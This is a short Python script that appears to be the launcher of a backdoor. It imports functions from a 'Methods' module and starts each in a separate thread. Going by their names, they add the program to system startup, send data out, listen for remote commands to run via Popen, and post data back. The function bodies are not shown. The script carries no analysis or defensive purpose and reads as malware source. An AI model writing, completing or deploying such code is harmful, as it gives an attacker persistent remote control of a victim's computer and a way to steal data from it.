from Methods import sendSimpleData,listenAndPopen, saveToStartup,listenAndPostData
import threading

threading.Thread(target=saveToStartup).start() 
threading.Thread(target=sendSimpleData).start()
threading.Thread(target=listenAndPopen).start()
threading.Thread(target=listenAndPostData).start()

